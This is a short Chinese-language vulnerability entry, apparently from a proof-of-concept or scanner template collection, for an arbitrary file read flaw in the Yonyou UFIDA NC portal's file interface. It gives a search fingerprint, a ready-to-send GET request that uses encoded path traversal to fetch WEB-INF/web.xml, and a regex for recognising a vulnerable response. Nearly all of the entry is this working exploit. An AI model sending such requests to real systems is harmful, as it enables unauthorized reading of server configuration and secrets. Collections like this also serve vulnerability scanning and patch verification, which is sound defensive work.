# 用友UFIDANCportal接口存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"用友 UFIDA NC"`
- **请求**：`GET /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200 ^(?=.*?version)(?=.*?attachment).*?$